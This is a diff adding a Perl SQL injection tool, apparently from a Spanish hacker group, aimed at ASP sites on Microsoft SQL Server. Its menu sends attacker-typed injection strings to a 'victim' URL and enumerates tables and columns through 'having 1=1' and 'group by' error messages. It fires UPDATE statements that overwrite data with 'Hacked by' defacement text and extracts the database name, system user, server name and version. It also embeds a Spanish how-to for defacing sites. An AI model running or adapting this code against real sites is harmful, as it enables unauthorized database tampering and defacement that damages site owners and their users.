@@ -1,0 +1,703 @@
+#!/usr/bin/perl
+
+# Inj3ct0r SQL Ole DB v.1
+# Code by JosS
+# Contact: sys-project[at]hotmail.com
+# Spanish Hackers Team
+# http://www.spanish-hackers.com
+
+use IO::Socket::INET;
+use LWP::UserAgent;
+use HTTP::Request;
+use LWP::Simple;
+
+sub lw
+{
+
+my $SO = $^O;
+my $linux = "";
+if (index(lc($SO),"win")!=-1){
+		   $linux="0";
+	    }else{
+		    $linux="1";
+	    }
+		if($linux){
+system("clear");
+}
+else{
+system("cls");
+system ("title Inj3ct0r SQL Ole DB v.1 - By JosS");
+system ("color 02");
+}
+
+}
+
+#*************************** Uso ******************************
+
+if (!$ARGV[0]) {
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+print "Usage: $0 [Host] \n";
+
+print "\n\n";
+
+print "EJ: $0 http://www.server.com/index.asp?id= \n";
+exit(1);
+}
+
+
+
+#*************************** Menu ******************************
+
+
+menu:;
+
+&lw;
+
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+print "Menu:\n";
+print "\n";
+
+print "1. Comprobar si la web se encuentra 0n\n";
+print "2. Injectar codigo manualmente\n";
+print "3. Injectar codigo automaticamente\n";
+print "4. Informacion del server\n";
+print "5. Manual Sql Injection\n";
+print "6. Creditos\n";
+print "7. Salir\n\n";
+
+print "Opcion:";
+$opcion=<STDIN>;
+
+if ($opcion!=1 && $opcion!=2 && $opcion!=3 && $opcion!=4 && $opcion!=5 && $opcion!=6 && $opcion!=7) 
+{
+print "Opción Incorrecta\n";
+goto menu;
+}
+if ($opcion==1)
+{
+&primero
+}
+if ($opcion==2)
+{
+&segundo
+}
+if ($opcion==3)
+{
+&tercero
+}
+if ($opcion==4)
+{
+&cuarto
+}
+if ($opcion==5)
+{
+&quinto
+}
+if ($opcion==6)
+{
+&sexto
+}
+if ($opcion==7)
+{
+&setimo
+}
+
+
+#*************************** Opcion1 ******************************
+
+sub primero
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+
+$host=$ARGV[0];
+
+($server) = $host =~ m{http://(.*?)/};
+
+print "Connect To ...: $server\n\n";
+
+$sock = IO::Socket::INET->new(PeerAddr => "$server", PeerPort => 80, Proto => "tcp");
+
+if ($sock)
+{
+print "La web esta On\n\n";
+}
+
+else
+
+{
+print "La web esta 0ff\n\n";
+}
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+}
+
+#*************************** Opcion2 ******************************
+
+sub segundo
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+
+$host=$ARGV[0];
+
+
+print "Escriba exit en comando si quiere terminar\n\n";
+
+print "Victima: $host\n\n";
+
+print "Comando: ";
+
+$comando=<STDIN>;
+
+chomp $comando;
+
+$comando =~ s/ /+/g;
+
+print "\n\n";
+
+print "Comando injectado: $comando\n\n";
+
+my $final = $host.$comando;
+print $final,"\n\n";
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+
+    if ( $doc =~ m/\bColumna?\b(.*?)\<\/font>/mosix ) {
+        print "MySql dice:  - $1\n\n";
+
+      ($tabla, $columna) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
+
+       print "tabla: $tabla\n";
+       print "Columna: $columna\n\n";
+
+    }
+    else {
+        print "El comando no se ejecuto con exito\n\n";
+    }
+
+
+
+##Do
+
+while ($comando ne 'exit') 
+{
+
+print "Escriba exit en comando si quiere terminar\n\n";
+
+print "Victima: $host\n\n";
+
+print "Comando: ";
+
+$comando=<STDIN>;
+
+chomp $comando;
+
+$comando =~ s/ /+/g;
+
+print "\n\n";
+
+print "Comando injectado: $comando\n\n";
+
+my $final = $host.$comando;
+print $final,"\n";
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+
+    if ( $doc =~ m/\bColumna?\b(.*?)\<\/font>/mosix ) {
+        print "MySql dice:  - $1\n\n";
+
+      ($tabla, $columna) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
+
+       print "tabla: $tabla\n";
+       print "Columna: $columna\n\n";
+
+    }
+    else {
+        print "El comando no se ejecuto con exito\n\n";
+    }
+
+
+
+}
+
+
+##
+
+
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+}
+
+#*************************** Opcion3 ******************************
+
+sub tercero
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+
+my @columna;
+
+$host=$ARGV[0];
+print "Victima: $host\n\n";
+
+print "Introduce tu Nick: ";
+$nick=<STDIN>;
+chomp $nick;
+
+@comando=("1 having 1=1--","' having 1=1--","--' having 1=1--");
+$comando =~ s/ /+/g;
+
+print "\n\n";
+
+for ($i=0;$i<=2;$i++)
+
+{
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "\t\t-----Primera Fase-----\n\n\n\n";
+
+print "Comando injectado: $comando[$i]\n\n\n\n";
+
+
+## Primera Fase ##
+
+
+if ( $doc =~ m/\bColumna?\b(.*?)\<\/font>/mosix ) {
+
+ 
+      ($tabla, $columna) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
+
+           push @columna, $columna;
+
+       print "tabla: $tabla\n";
+       print "Columna: $columna\n\n";
+
+      @comando=("' update $tabla set $columna[0]='<h1>Hacked by $nick'--","1 update $tabla set $columna[0]='<h1>Hacked by $nick'--","--'update $tabla set $columna[0]='<h1>Hacked by $nick'--");
+
+      for ($i=0;$i<=2;$i++)
+
+    {
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "Comando injectado: $comando[$i]\n\n";
+
+}
+
+## Segunda Fase ##
+
+print "\t\t-----Segunda Fase-----\n\n\n\n";
+
+     @comando=("1 group by $columna[0] having 1=1--","' group by $columna[0] having 1=1--","--' group by $columna[0] having 1=1--");
+
+
+      for ($i=0;$i<=2;$i++)
+
+    {
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "Comando injectado: $comando[$i]\n\n";
+
+if ( $doc =~ m/\bColumna?\b(.*?)\<\/font>/mosix ) {
+
+($tabla, $columna) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
+
+           push @columna, $columna;
+
+       print "tabla: $tabla\n";
+       print "Columna: $columna\n\n";
+
+@comando=("' update $tabla set $columna[1]='<h1>Hacked by $nick'--","1 update $tabla set $columna[1]='<h1>Hacked by $nick'--","--'update $tabla set $columna[1]='<h1>Hacked by $nick'--");
+
+ for ($i=0;$i<=2;$i++)
+
+    {
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "Comando injectado: $comando[$i]\n\n";
+
+}
+
+
+}
+
+}
+
+## Tercera Fase ##
+
+print "\t\t-----Tercera Fase-----\n\n\n\n";
+
+@comando=("1 group by $columna[0],$columna[1] having 1=1--","' group by $columna[0],$columna[1] having 1=1--","--' group by $columna[0],$columna[1] having 1=1--");
+
+
+for ($i=0;$i<=2;$i++)
+
+    {
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "Comando injectado: $comando[$i]\n\n";
+
+if ( $doc =~ m/\bColumna?\b(.*?)\<\/font>/mosix ) {
+
+($tabla, $columna) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
+
+           push @columna, $columna;
+
+       print "tabla: $tabla\n";
+       print "Columna: $columna\n\n";
+
+@comando=("' update $tabla set $columna[2]='<h1>Hacked by $nick'--","1 update $tabla set $columna[2]='<h1>Hacked by $nick'--","--'update $tabla set $columna[2]='<h1>Hacked by $nick'--");
+
+
+for ($i=0;$i<=2;$i++)
+
+    {
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+print "Comando injectado: $comando[$i]\n\n";
+
+}
+
+
+}
+
+}
+
+
+ } #Cierre del If
+    else {
+        print "El comando no se ejecuto con exito\n\n";
+    }
+
+
+} # Cierre del for principal
+
+
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+
+} ##Cierre del sub
+
+#*************************** Opcion4 ******************************
+
+sub cuarto
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+
+$host=$ARGV[0];
+print "Victima: $host\n\n";
+
+@comando=("1+and+1=convert(int,db_name())","1+and+1=convert(int,system_user)","1+and+1=convert(int,\@\@servername)--",'1+and+1=convert(int,@@version)--');
+
+
+for ($i=0;$i<=3;$i++)
+
+{
+
+my $final = $host.$comando[$i];
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => $final);
+$doc = $ua->request($req)->as_string;
+
+if ( $doc =~ /Syntax\s(.*)<\/font>/mosix )
+{
+
+if ($comando[$i] eq "1+and+1=convert(int,db_name())")
+{
+
+print "db_name:\n";
+
+$dbname = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
+print "$dbname\n\n";
+
+}
+
+if ($comando[$i] eq "1+and+1=convert(int,system_user)")
+
+{
+
+print "system_user:\n";
+
+$systemuser = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
+print "$systemuser\n\n";
+
+}
+
+if ($comando[$i] eq "1+and+1=convert(int,\@\@servername)--")
+
+{
+
+print "servername:\n";
+
+$servername = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
+print "$servername\n\n";
+
+}
+
+if ($comando[$i] eq '1+and+1=convert(int,@@version)--')
+
+{
+
+print "version:\n";
+
+$version = $1 if ($doc =~ /.*?value\s'(.*?)'\sto.*/sm);
+print "$version\n\n";
+
+}
+
+} # Cierre del if principal
+
+
+} # cierre for
+
+
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+}
+
+#*************************** Opcion5 ******************************
+
+sub quinto
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+print " MANUAL PRACTICO SQL INJECTION
+    (Microsoft OLE DB)
+
+Para sacar las tablas y columnas, tenemos que ejecutar este comando:
+
+' having 1=1--
+
+Y como resultado tendremos algo como esto:
+
+Microsoft OLE DB Provider for SQL Server error '80040e14' 
+Column 'F_CTexto_1.CTe_Titulo' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+/visualizaciones/ctexto.asp, line 17 
+
+Bien, pues la tabla y la columna son estas:
+
+Tabla: F_CTexto_1
+Columna: CTe_Titulo
+
+A partir de la columna podemos sacar el resto de columnas que se encuentran en la tabla. Mediante este comando:
+
+' group by columna having 1=1--
+' group by CTe_Titulo having 1=1--
+
+Y obtenemos:
+
+Microsoft OLE DB Provider for SQL Server error '80040e14' 
+Column 'F_CTexto_1.IdCTexto' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+/visualizaciones/ctexto.asp, line 17 
+
+Entonces ya tenemos otra columna: IdCTexto. Podemos ir sacando mas de esta forma:
+
+' group by Cte_Titulo,IdCTexto having 1=1--
+
+Obtenemos:
+
+Microsoft OLE DB Provider for SQL Server error '80040e14' 
+Column 'F_CTexto_1.CTe_Descripcion' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+/visualizaciones/ctexto.asp, line 17 
+
+Y asi sucesivamente vamos consigiendo las columnas. Una vez que tenemos todas las columnas, les hacemos un update para colocar nuestro propio texto y asi defacearla.
+
+' update tabla set columna='HACKED BY JOSS'--
+' update F_CTexto_1 set CTe_Descripcion='HACKED BY JOSS'--
+
+
+Escrito por JosS
+
+
+
+ ";
+
+
+
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+}
+
+#*************************** Opcion6 ******************************
+
+sub sexto
+
+{
+
+&lw;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Inj3ct0r SQL Ole DB v.1 - Spanish Hackers Team    #\n\n";
+print "\t\t#                        by JosS                       #\n\n";
+print "\t\t########################################################\n\n";
+
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+
+$year += 1900;
+$mon++;
+
+print "\t\t\t\t$mday/$mon/$year $hour:$min:$sec\n\n";
+
+print " Programador: Jose Luis Gongora Fernandez (JosS)\n\n";
+print " Colaboradores: phnx & explorer & kidd \n\n";
+print " Greetz To: All Hackers\n\n";
+
+print "Pulse la tecla Enter para volver al menu.";
+$volver=<STDIN>;
+goto menu;
+
+}
+
+#*************************** Opcion7 ******************************
+
+sub setimo
+
+{
+
+&lw;
+
+exit(1);
+
+}
+
+# spanish-hackers.com
